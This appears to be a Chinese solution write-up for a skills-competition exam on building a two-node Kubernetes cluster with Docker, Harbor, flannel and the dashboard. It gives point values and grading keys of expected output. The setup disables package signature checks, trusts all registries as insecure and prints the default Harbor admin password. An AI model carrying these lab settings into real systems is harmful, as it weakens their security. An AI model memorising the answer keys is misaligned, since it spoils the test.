<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">（1）修改主机名并配置映射</span><br><span class="line">master节点：</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">hostnamectl set-hostname master</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">passwd root</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="built_in">cat</span> /etc/hosts</span></span><br><span class="line">127.0.0.1   localhost localhost.localdomain localhost4 localhost4.localdomain4</span><br><span class="line">::1         localhost localhost.localdomain localhost6 localhost6.localdomain6</span><br><span class="line">192.168.100.91 master</span><br><span class="line">192.168.100.23 node</span><br><span class="line">node1节点：</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">hostnamectl set-hostname node</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">passwd root</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="built_in">cat</span> /etc/hosts</span></span><br><span class="line">127.0.0.1   localhost localhost.localdomain localhost4 localhost4.localdomain4</span><br><span class="line">::1         localhost localhost.localdomain localhost6 localhost6.localdomain6</span><br><span class="line">192.168.100.91 master</span><br><span class="line">192.168.100.23 node</span><br><span class="line">（2）关闭swap</span><br><span class="line">master和node节点关闭swap：</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">swapoff -a</span></span><br><span class="line">[root@master ~]# free -m</span><br><span class="line">total        used        free      shared  buff/cache   available</span><br><span class="line">Mem:       7821         129        7548          16         143        7468</span><br><span class="line">Swap:         0           0           0</span><br><span class="line">[root@master ~]# ping node -c 3</span><br><span class="line">PING node (192.168.100.23) 56(84) bytes of data.</span><br><span class="line">64 bytes from node (192.168.100.23): icmp_seq=1 ttl=64 time=0.228 ms</span><br><span class="line">64 bytes from node (192.168.100.23): icmp_seq=2 ttl=64 time=0.242 ms</span><br><span class="line">64 bytes from node (192.168.100.23): icmp_seq=3 ttl=64 time=0.151 ms</span><br><span class="line"></span><br><span class="line">--- node ping statistics ---</span><br><span class="line">3 packets transmitted, 3 received, 0% packet loss, time 1999ms</span><br><span class="line">rtt min/avg/max/mdev = 0.151/0.207/0.242/0.040 ms</span><br></pre></td></tr></table></figure>

<h3 id="2-镜像文件的复制"><a href="#2-镜像文件的复制" class="headerlink" title="2.镜像文件的复制"></a>2.镜像文件的复制</h3><p>&#x2F;root目录存放有CentOS-7-x86_64-DVD-2009.iso和kubernetes_V1.2.iso光盘镜像文件，在&#x2F;opt目录下使用命令创建centos目录，并将镜像文件CentOS-7-x86_64-DVD-2009.iso中的内容复制到centos目录下，将镜像文件kubernetes_V1.2.iso中的内容复制到 &#x2F;opt目录下。</p>
<p>请在master节点将du -h &#x2F;opt&#x2F; –max-depth&#x3D;1命令的返回结果提交到答题框。【1.5分】</p>
<p><strong>标准: 4.5G&amp;¢os&amp;&amp;2.8G&amp;&amp;images</strong></p>
<p>解法:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">master节点：</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="built_in">mkdir</span> /opt/centos</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">mount -o loop CentOS-7-x86_64-DVD-2009.iso /mnt/</span></span><br><span class="line">mount: /dev/loop0 is write-protected, mounting read-only</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="built_in">cp</span> -rvf /mnt/* /opt/centos/</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">umount /mnt</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">mount -o loop kubernetes_V1.2.iso /mnt/</span></span><br><span class="line">mount: /dev/loop0 is write-protected, mounting read-only</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="built_in">cp</span> -rvf /mnt/* /opt/</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">umount /mnt</span></span><br><span class="line">[root@master ~]# du -h /opt/ --max-depth=1</span><br><span class="line">4.5G    /opt/centos</span><br><span class="line">77M /opt/cri</span><br><span class="line">25M /opt/docker-compose</span><br><span class="line">630M    /opt/harbor</span><br><span class="line">2.8G    /opt/images</span><br><span class="line">172M    /opt/kubernetes-repo</span><br><span class="line">20K /opt/yaml</span><br><span class="line">8.1G    /opt/</span><br></pre></td></tr></table></figure>

<h3 id="3-Yum源的编写"><a href="#3-Yum源的编写" class="headerlink" title="3.Yum源的编写"></a>3.Yum源的编写</h3><p>在master节点首先将系统自带的yum源移动到&#x2F;home目录，然后为master节点配置本地yum源，yum源文件名为local.repo。</p>
<p>将yum repolist命令的返回结果提交到答题框。【1.5分】</p>
<p><strong>标准: 4070&amp;&amp;45</strong></p>
<p>解法:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="built_in">mv</span> /etc/yum.repos.d/CentOS-* /home</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">[root@master ~] <span class="built_in">cat</span> /etc/yum.repos.d/local.repo</span></span><br><span class="line">[centos]</span><br><span class="line">name=centos</span><br><span class="line">baseurl=file:///opt/centos</span><br><span class="line">gpgcheck=0</span><br><span class="line">enabled=1</span><br><span class="line">[k8s]</span><br><span class="line">name=k8s</span><br><span class="line">baseurl=file:///opt/kubernetes-repo</span><br><span class="line">gpgcheck=0</span><br><span class="line">enabled=1</span><br><span class="line">[root@master ~]# yum repolist</span><br><span class="line">Loaded plugins: fastestmirror</span><br><span class="line">Loading mirror speeds from cached hostfile</span><br><span class="line">repo id                       repo name                    status</span><br><span class="line">centos                        centos                       4,070</span><br><span class="line">k8s                           k8s                             45</span><br><span class="line">repolist: 4,115</span><br></pre></td></tr></table></figure>

<h3 id="4-安装ftp服务"><a href="#4-安装ftp服务" class="headerlink" title="4.安装ftp服务"></a><strong>4.安装ftp服务</strong></h3><p>在master节点安装ftp服务，将ftp共享目录设置为 &#x2F;opt。</p>
<p>将ps -ef | grep ftp命令的返回结果提交到答题框。【1.5分】</p>
<p><strong>标准: vsftpd.conf</strong></p>
<p>解法:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">yum install -y vsftpd</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">vi /etc/vsftpd/vsftpd.conf</span></span><br><span class="line">anon_root=/opt</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">systemctl start vsftpd &amp;&amp; systemctl <span class="built_in">enable</span> vsftpd</span></span><br><span class="line">[root@master ~]# ps -ef | grep ftp</span><br><span class="line">root      8112     1  0 07:32 ?        00:00:00 /usr/sbin/vsftpd /etc/vsftpd/vsftpd.conf</span><br><span class="line">root      8171  7670  0 07:36 pts/0    00:00:00 grep --color=auto ftp</span><br></pre></td></tr></table></figure>

<h3 id="5-ftp源的编写"><a href="#5-ftp源的编写" class="headerlink" title="5.ftp源的编写"></a>5.ftp源的编写</h3><p>为node节点配置ftp源，ftp源文件名称为ftp.repo，其中ftp服务器地址为master节点,配置ftp源时不要写IP地址。</p>
<p>在node节点请将curl <a href="ftp://master命令的返回结果提交到答题框.【1.5分】/">ftp://master命令的返回结果提交到答题框。【1.5分】</a></p>
<p><strong>标准: harbor&amp;&amp;centos</strong></p>
<p>解法: </p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@node1 ~]# rm -rf /etc/yum.repos.d/*</span><br><span class="line"> [root@node1 ~]# cat  /etc/yum.repos.d/ftp.repo</span><br><span class="line">[centos]</span><br><span class="line">name=centos</span><br><span class="line">baseurl=ftp://master/centos</span><br><span class="line">gpgcheck=0</span><br><span class="line">enabled=1</span><br><span class="line">[k8s]</span><br><span class="line">name=k8s</span><br><span class="line">baseurl=ftp://master/kubernetes-repo</span><br><span class="line">gpgcheck=0</span><br><span class="line">enabled=1</span><br><span class="line">[root@node ~]# curl ftp://master</span><br><span class="line">drwxr-xr-x    8 0        0             220 Mar 15 07:14 centos</span><br><span class="line">dr-xr-xr-x    2 0        0             131 Mar 15 07:15 cri</span><br><span class="line">dr-xr-xr-x    2 0        0              49 Mar 15 07:15 docker-compose</span><br><span class="line">dr-xr-xr-x    2 0        0              49 Mar 15 07:15 harbor</span><br><span class="line">dr-xr-xr-x    2 0        0              72 Mar 15 07:16 images</span><br><span class="line">dr-xr-xr-x    3 0        0            4096 Mar 15 07:16 kubernetes-repo</span><br></pre></td></tr></table></figure>

<h3 id="6-设置时间同步服务器"><a href="#6-设置时间同步服务器" class="headerlink" title="6.设置时间同步服务器"></a>6.设置时间同步服务器</h3><p>在master节点上部署chrony服务器，允许其它节点同步时间，启动服务并设置为开机自启动；在其他节点上指定master节点为上游NTP服务器，重启服务并设为开机自启动。（配置文件IP用计算机名代替）</p>
<p>在node节点将chronyc  sources命令的返回结果提交到答题框。【1.5分】</p>
<p><strong>标准: master&amp;&amp;us</strong></p>
<p>解法:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">master节点：</span><br><span class="line"> yum install -y chrony</span><br><span class="line"> vi /etc/chrony.conf</span><br><span class="line">server  master  iburst</span><br><span class="line">allow  all</span><br><span class="line">local stratum 10</span><br><span class="line">systemctl start chronyd</span><br><span class="line"> systemctl enable chronyd</span><br><span class="line">node节点：</span><br><span class="line"> yum install -y chrony</span><br><span class="line"> vi /etc/chrony.conf</span><br><span class="line">server master  iburst</span><br><span class="line">systemctl start chronyd</span><br><span class="line">systemctl enable chronyd</span><br><span class="line">[root@node ~]# chronyc sources</span><br><span class="line">210 Number of sources = 1</span><br><span class="line">MS Name/IP address         Stratum Poll Reach LastRx Last sample              </span><br><span class="line">===============================================================================</span><br><span class="line">^* master                       10   6     7    15  -1014ns[ -999us] +/-  134us</span><br></pre></td></tr></table></figure>

<h3 id="7-设置免密登录"><a href="#7-设置免密登录" class="headerlink" title="7.设置免密登录"></a>7.设置免密登录</h3><p>为两台台服务器设置免密登录，保证服务器之间能够互相免密登录。</p>
<p>在master节点将ssh node命令的返回结果提交到答题框。【1.5分】</p>
<p><strong>标准: Last&amp;&amp;login&amp;&amp;from&amp;&amp;successful</strong></p>
<p>解法:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ssh-keygen</span><br><span class="line">ssh-copy-id  master</span><br><span class="line">ssh-copy-id  node</span><br><span class="line">   其它节点的命令和上面一样</span><br><span class="line">[root@harbor ~]# ssh node</span><br><span class="line">Last failed login: Wed Mar 15 09:30:02 UTC 2023 from 170.210.208.108 on ssh:notty</span><br><span class="line">There were 17 failed login attempts since the last successful login.</span><br><span class="line">Last login: Wed Mar 15 02:57:03 2023 from 58.240.20.122</span><br></pre></td></tr></table></figure>

<h2 id="任务2-k8s搭建任务（19-5分）"><a href="#任务2-k8s搭建任务（19-5分）" class="headerlink" title="任务2 k8s搭建任务（19.5分）"></a>任务2 k8s搭建任务（19.5分）</h2><h3 id="1-安装docker应用"><a href="#1-安装docker应用" class="headerlink" title="1.安装docker应用"></a>1.安装docker应用</h3><p>在所有节点上安装dokcer-ce,并设置为开机自启动。</p>
<p>在master节点请将docker version命令的返回结果提交到答题框。【1.5分】</p>
<p>标准: 20.10.22&amp;&amp;1.41&amp;&amp;go1.18.9</p>
<p>解法:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">yum install -y yum-utils device-mapper-persistent-data lvm2</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">yum install -y docker-ce</span></span><br><span class="line">启动Docker：</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">systemctl start docker</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">systemctl <span class="built_in">enable</span> docker</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">docker version</span></span><br><span class="line">[root@master ~]# docker version</span><br><span class="line">Client: Docker Engine - Community</span><br><span class="line"> Version:           20.10.22</span><br><span class="line"> API version:       1.41</span><br><span class="line"> Go version:        go1.18.9</span><br><span class="line"> Git commit:        3a2c30b</span><br><span class="line"> Built:             Thu Dec 15 22:30:24 2022</span><br><span class="line"> OS/Arch:           linux/amd64</span><br><span class="line"> Context:           default</span><br><span class="line"> Experimental:      true</span><br><span class="line"></span><br><span class="line">Server: Docker Engine - Community</span><br><span class="line"> Engine:</span><br><span class="line">  Version:          20.10.22</span><br><span class="line">  API version:      1.41 (minimum version 1.12)</span><br><span class="line">  Go version:       go1.18.9</span><br><span class="line">  Git commit:       42c8b31</span><br><span class="line">  Built:            Thu Dec 15 22:28:33 2022</span><br><span class="line">  OS/Arch:          linux/amd64</span><br><span class="line">  Experimental:     false</span><br><span class="line"> containerd:</span><br><span class="line">  Version:          1.6.14</span><br><span class="line">  GitCommit:        9ba4b250366a5ddde94bb7c9d1def331423aa323</span><br><span class="line"> runc:</span><br><span class="line">  Version:          1.1.4</span><br><span class="line">  GitCommit:        v1.1.4-0-g5fd4c4d</span><br><span class="line"> docker-init:</span><br><span class="line">  Version:          0.19.0</span><br><span class="line">  GitCommit:        de40ad0</span><br></pre></td></tr></table></figure>

<h3 id="2-安装docker应用"><a href="#2-安装docker应用" class="headerlink" title="2.安装docker应用"></a>2.安装docker应用</h3><p>所有节点配置阿里云镜像加速地址(<a href="https://d8b3zdiw.mirror.aliyuncs.com)并把启动引擎设置为systemd,配置成功后加载配置文件并重启docker服务./">https://d8b3zdiw.mirror.aliyuncs.com)并把启动引擎设置为systemd，配置成功后加载配置文件并重启docker服务。</a></p>
<p>将docker pull ubuntu命令的返回结果提交到答题框。【1.5分】</p>
<p><strong>标准: complete&amp;&amp;docker.io&#x2F;library&#x2F;ubuntu:latest</strong></p>
<p>解法:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@master ~]# vi /etc/docker/daemon.json</span><br><span class="line">&#123;</span><br><span class="line">  &quot;insecure-registries&quot; : [&quot;0.0.0.0/0&quot;],</span><br><span class="line">  &quot;registry-mirrors&quot;: [&quot;https://d8b3zdiw.mirror.aliyuncs.com&quot;],</span><br><span class="line">  &quot;exec-opts&quot;: [&quot;native.cgroupdriver=systemd&quot;]</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">systemctl restart docker</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">systemctl daemon-reload</span></span><br><span class="line">[root@master ~]# docker pull ubuntu</span><br><span class="line">Using default tag: latest</span><br><span class="line">latest: Pulling from library/ubuntu</span><br><span class="line">7b1a6ab2e44d: Pull complete</span><br><span class="line">Digest: sha256:626ffe58f6e7566e00254b638eb7e0f3b11d4da9675088f4781a50ae288f3322</span><br><span class="line">Status: Downloaded newer image for ubuntu:latest</span><br><span class="line">docker.io/library/ubuntu:latest</span><br></pre></td></tr></table></figure>

<h3 id="3-载入镜像"><a href="#3-载入镜像" class="headerlink" title="3.载入镜像"></a>3.载入镜像</h3><p> 在master节点&#x2F;opt&#x2F;images目录下使用tar归档文件载入镜像。</p>
<p>   将docker images | grep mysql命令的返回结果提交到答题框。【1.5分】</p>
<p><strong>标准: mysql&amp;&amp;5.6&amp;&amp;303MB</strong></p>
<p>解法:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">docker load -i images/httpd.tar</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">docker load -i images/Kubernetes_Base.tar</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">docker load -i images/Resource-1.tar</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">docker images | grep mysql</span></span><br><span class="line">mysql  5.6   dd3b2a5dcb48   14 months ago   303MB</span><br></pre></td></tr></table></figure>

<h3 id="4-安装docker-compose"><a href="#4-安装docker-compose" class="headerlink" title="4.安装docker-compose"></a>4.安装docker-compose</h3><p>在master节点使用 &#x2F;opt&#x2F;docker-compose&#x2F;v2.10.2-docker-compose-linux-x86_64文件安装docker-compose。安装完成后执行docker-compose version命令。</p>
<p>将docker-compose version命令的返回结果提交到答题框。【1.5分】</p>
<p><strong>标准: Compose&amp;&amp;v2.10.2</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="built_in">chmod</span> +x /opt/docker-compose/v2.10.2-docker-compose-linux-x86_64</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="built_in">mv</span> /opt/docker-compose/v2.10.2-docker-compose-linux-x86_64 /usr/local/bin/docker-compose</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">docker-compose version</span></span><br><span class="line">Docker Compose version v2.10.2</span><br></pre></td></tr></table></figure>

<h3 id="5-搭建horbor仓库"><a href="#5-搭建horbor仓库" class="headerlink" title="5.搭建horbor仓库"></a>5.搭建horbor仓库</h3><p>在master节点解压&#x2F;opt&#x2F;harbor&#x2F; harbor-offline-installer-v2.5.3.tgz离线安装包，然后安装harbor仓库，并修改相应的yml文件，使各节点默认docker仓库为harbor仓库地址。</p>
<p>在master节点请将docker-compose ps命令的返回结果提交到答题框。【1.5分】</p>
<p><strong>标准: harbor-core&amp;&amp;nginx&amp;®istry&amp;&amp;running&amp;&amp;(healthy)</strong></p>
<p>解法: </p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="built_in">cd</span> /opt/harbor/</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">tar -zxvf harbor-offline-installer-v2.5.3.tgz</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="built_in">cd</span> harbor</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="built_in">cp</span> harbor.yml.tmpl harbor.yml</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">vi harbor.yml</span></span><br><span class="line">hostname: 192.168.100.10  # 将域名修改为本机IP</span><br><span class="line">harbor_admin_password: Harbor12345</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">sed -i <span class="string">&quot;13s/^/#/g&quot;</span> harbor.yml</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">sed -i <span class="string">&quot;15,18s/^/#/g&quot;</span> harbor.yml</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">docker load -i harbor.v2.5.3.tar.gz</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">./prepare</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">./install.sh</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">docker-compose ps</span></span><br></pre></td></tr></table></figure>

<h3 id="6-上传docker镜像"><a href="#6-上传docker镜像" class="headerlink" title="6.上传docker镜像"></a>6.上传docker镜像</h3><p>在master节点执行&#x2F;opt&#x2F;k8s_image_push.sh将所有镜像上传至docker仓库。</p>
<p>将docker login master命令的返回结果提交到答题框(填写完整提示输入的内容)。【1.5分】</p>
<p><strong>标准: Login&amp;&amp;Succeeded</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="built_in">cd</span> /opt/images/</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">./k8s_image_push.sh</span></span><br><span class="line">输入镜像仓库地址(不加http/https):192.168.100.91</span><br><span class="line">输入镜像仓库用户名: admin</span><br><span class="line">输入镜像仓库用户密码: Harbor12345</span><br><span class="line">您设置的仓库地址为: 192.168.100.10,用户名: admin,密码: xxx</span><br><span class="line">是否确认(Y/N): Y</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">docker login master</span></span><br><span class="line">Username: admin</span><br><span class="line">Password:</span><br><span class="line">WARNING! Your password will be stored unencrypted in /root/.docker/config.json.</span><br><span class="line">Configure a credential helper to remove this warning. See</span><br><span class="line">https://docs.docker.com/engine/reference/commandline/login/#credentials-store</span><br><span class="line"></span><br><span class="line">Login Succeeded</span><br></pre></td></tr></table></figure>

<h3 id="7-部署Kubeadm、containerd、nerdctl和buildkit"><a href="#7-部署Kubeadm、containerd、nerdctl和buildkit" class="headerlink" title="7.部署Kubeadm、containerd、nerdctl和buildkit"></a>7.部署Kubeadm、containerd、nerdctl和buildkit</h3><p> 执行&#x2F;opt&#x2F;k8s_con_ner_bui_install.sh部署Kubeadm、containerd、nerdctl和buildkit。</p>
<p>   将ctr version命令的返回结果提交到答题框。【1.5分】</p>
<p><strong>标准: 1.6.14&amp;&amp;go1.18.9</strong></p>
<p>解法:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">/opt/k8s_con_ner_bui_install.sh</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">ctr version</span></span><br><span class="line">Client:</span><br><span class="line">  Version:  1.6.14</span><br><span class="line">  Revision: 9ba4b250366a5ddde94bb7c9d1def331423aa323</span><br><span class="line">  Go version: go1.18.9</span><br><span class="line"></span><br><span class="line">Server:</span><br><span class="line">  Version:  1.6.14</span><br><span class="line">  Revision: 9ba4b250366a5ddde94bb7c9d1def331423aa323</span><br><span class="line">  UUID: ce069adb-c580-4c0d-b451-f22d0df0bae6</span><br></pre></td></tr></table></figure>

<h3 id="8-初始化集群"><a href="#8-初始化集群" class="headerlink" title="8.初始化集群"></a>8.初始化集群</h3><p>在master节点kubeadm命令初始化集群，使用本地Harbor仓库。</p>
<p>   将kubectl get nodes命令的返回结果提交到答题框。【1.5分】</p>
<p><strong>标准: master&amp;&amp;NotReady&amp;&amp;v1.25.0</strong></p>
<p>解法</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">kubeadm init --kubernetes-version=1.25.0 --apiserver-advertise-address=192.168.100.91 --image-repository 192.168.100.91/library --pod-network-cidr=10.244.0.0/16</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">  kubectl get nodes</span></span><br><span class="line">NAME     STATUS     ROLES           AGE     VERSION</span><br><span class="line">master   NotReady   control-plane   9m42s   v1.25.0</span><br></pre></td></tr></table></figure>

<h3 id="9-安装kubernetes网络插件"><a href="#9-安装kubernetes网络插件" class="headerlink" title="9.安装kubernetes网络插件"></a>9.安装kubernetes网络插件</h3><p>修改提供的&#x2F;opt&#x2F;yaml&#x2F;flannel&#x2F;kube-flannel.yaml,使其镜像来源为本地Harbor仓库，然后安装kubernetes网络插件，安装完成后使用命令查看节点状态。</p>
<p>将kubectl get pods -A命令的返回结果提交到答题框。【1.5分】</p>
<p><strong>标准: etcd-master&amp;&amp;kube-controller-manager-master&amp;&amp;Running</strong></p>
<p>解法:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="built_in">eval</span> sed -i <span class="string">&#x27;s@docker.io/flannel@192.168.100.91/library@g&#x27;</span> /opt/yaml/flannel/kube-flannel.yaml</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">[root@master ~]# kubectl apply -f /opt/yaml/flannel/kube-flannel.yaml</span></span><br><span class="line">[root@master opt]# kubectl get pods -A</span><br><span class="line">NAMESPACE      NAME                             READY   STATUS    RESTARTS   AGE</span><br><span class="line">kube-flannel   kube-flannel-ds-bqd2x            1/1     Running   0          74s</span><br><span class="line">kube-system    coredns-7f474965b8-88ckf         1/1     Running   0          34m</span><br><span class="line">kube-system    coredns-7f474965b8-rzh2x         1/1     Running   0          34m</span><br><span class="line">kube-system    etcd-master                      1/1     Running   0          34m</span><br><span class="line">kube-system    kube-apiserver-master            1/1     Running   0          34m</span><br><span class="line">kube-system    kube-controller-manager-master   1/1     Running   0          34m</span><br><span class="line">kube-system    kube-proxy-fb29c                 1/1     Running   0          34m</span><br><span class="line">kube-system    kube-scheduler-master            1/1     Running   0          34m</span><br></pre></td></tr></table></figure>

<h3 id="10-创建证书"><a href="#10-创建证书" class="headerlink" title="10.创建证书"></a>10.创建证书</h3><p> 给kubernetes创建证书,命名空间为kubernetes-dashboard,涉及到的所有文件命名为dashboard例如dashboard.crt。</p>
<p>将kubectl get csr命令的返回结果提交到答题框。【1.5分】</p>
<p><strong>标准:kubernetes.io&#x2F;kube-apiserver-client-kubelet&amp;&amp;system:node:master</strong></p>
<p>解法:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="built_in">mkdir</span> /opt/dashboard-certs</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="built_in">cd</span> /opt/dashboard-certs/</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">kubectl create namespace kubernetes-dashboard</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">openssl genrsa -out dashboard.key 2048</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">openssl req -days 36000 -new -out dashboard.csr -key dashboard.key -subj <span class="string">&#x27;/CN=dashboard-cert&#x27;</span></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">openssl x509 -req -<span class="keyword">in</span> dashboard.csr -signkey dashboard.key -out dashboard.crt</span></span><br><span class="line">Signature ok</span><br><span class="line">subject=/CN=dashboard-cert</span><br><span class="line">Getting Private key</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">kubectl create secret generic kubernetes-dashboard-certs --from-file=dashboard.key --from-file=dashboard.crt -n kubernetes-dashboard</span></span><br><span class="line"><span class="meta prompt_"> # </span><span class="language-bash">kubectl get csr</span></span><br><span class="line">NAME        AGE   SIGNERNAME                                    REQUESTOR            REQUESTEDDURATION   CONDITION</span><br><span class="line">csr-s5d6s   63m   kubernetes.io/kube-apiserver-client-kubelet   system:node:master   &lt;none&gt;              Approved,Issued</span><br></pre></td></tr></table></figure>

<h3 id="11-kubernetes-图形化界面的安装"><a href="#11-kubernetes-图形化界面的安装" class="headerlink" title="11.kubernetes 图形化界面的安装"></a>11.kubernetes 图形化界面的安装</h3><p>修改&#x2F;opt&#x2F;yaml&#x2F;dashboard&#x2F;recommended.yaml的镜像来源为本地Harbor仓库，然后使用&#x2F;opt&#x2F;yaml&#x2F;dashboard&#x2F;recommended.yaml和&#x2F;opt&#x2F;yaml&#x2F;dashboard&#x2F;dashadmin-user.yaml安装kubernetes dashboard界面，完成后查看首页。</p>
<p>将kubectl get svc -n kubernetes-dashboard命令的返回结果提交到答题框。【1.5分】</p>
<p><strong>标准: dashboard-metrics-scraper&amp;&amp;kubernetes-dashboard&amp;&amp;NodePort&amp;&amp;ClusterIP</strong></p>
<p>解法:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="built_in">eval</span> sed -i <span class="string">&quot;s/kubernetesui/192.168.100.91\/library/g&quot;</span> /opt/yaml/dashboard/recommended.yaml</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">kubectl apply -f /opt/yaml/dashboard/recommended.yaml</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">kubectl apply -f /opt/yaml/dashboard/dashadmin-user.yaml</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">kubectl get svc -n kubernetes-dashboard</span></span><br><span class="line">NAME                        TYPE        CLUSTER-IP       EXTERNAL-IP   PORT(S)         AGE</span><br><span class="line">dashboard-metrics-scraper   ClusterIP   10.105.211.63    &lt;none&gt;        8000/TCP        23m</span><br><span class="line">kubernetes-dashboard        NodePort    10.104.143.162   &lt;none&gt;        443:30001/TCP   23m</span><br></pre></td></tr></table></figure>

<h3 id="12-删除污点"><a href="#12-删除污点" class="headerlink" title="12.删除污点"></a>12.删除污点</h3><p>为了能使pod调度到master节点,用命令删除污点。在浏览器访问dashboard（<a href="https://IP:30001）">https://IP:30001）</a></p>
<p>将kubectl describe nodes master | grep Taints命令的返回结果提交到答题框。【1.5分】</p>
<p><strong>标准:Taints&amp;&amp;none</strong></p>
<p>解法:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">kubectl describe nodes master | grep Taints</span></span><br><span class="line">kubectl taint nodes master node-role.kubernetes.io/control-plane-</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">kubectl describe nodes master | grep Taints</span></span><br><span class="line">Taints:             &lt;none&gt;</span><br></pre></td></tr></table></figure>

<h3 id="13-扩展计算节点"><a href="#13-扩展计算节点" class="headerlink" title="13.扩展计算节点"></a>13.扩展计算节点</h3><p>在node节点执行k8s_node_install.sh，将该节点加入kubernetes集群。完成后在master节点上查看所有节点状态。</p>
<p>在master节点请将kubectl get nodes命令的返回结果提交到答题框。【1.5分】</p>
<p><strong>标准: master&amp;&amp;node&amp;&amp;v1.25.0</strong></p>
<p>解法:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@node opt]# ./k8s_node_install.sh</span><br><span class="line">[root@master opt]# kubectl get nodes</span><br><span class="line">NAME     STATUS   ROLES           AGE     VERSION</span><br><span class="line">master   Ready    control-plane   151m    v1.25.0</span><br><span class="line">node     Ready    &lt;none&gt;          4m50s   v1.25.0</span><br></pre></td></tr></table></figure>

<h2 id="任务3部署Owncloud网盘服务（10-分）"><a href="#任务3部署Owncloud网盘服务（10-分）" class="headerlink" title="任务3部署Owncloud网盘服务（10 分）"></a>任务3部署Owncloud网盘服务（10 分）</h2><p>ownCloud 是一个开源免费专业的私有云存储项目，它能帮你快速在个人电脑或服务器上架设一套专属的私有云文件同步网盘，可以像 百度云那样实现文件跨平台同步、共享、版本控制、团队协作等。</p>
